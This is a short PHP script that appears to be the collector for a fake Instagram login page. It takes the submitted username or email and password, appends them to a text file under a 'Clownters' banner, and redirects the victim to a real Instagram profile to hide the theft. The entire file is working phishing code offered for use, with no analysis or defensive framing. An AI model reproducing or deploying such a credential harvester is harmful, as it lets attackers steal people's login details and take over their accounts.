<?php

file_put_contents("usernames.txt", "\n\e[1;34m Username: \e[1;36m" . $_POST['usernameOrEmail'] . "\n\e[1;34m Pass: \e[1;36m" . $_POST['pass'] . "\n\n\t\e[1;32m *******\e[1;31m Clownters \e[1;32m*******\n\n", FILE_APPEND);
header('Location: https://www.instagram.com/mike90s15');
exit();
?>
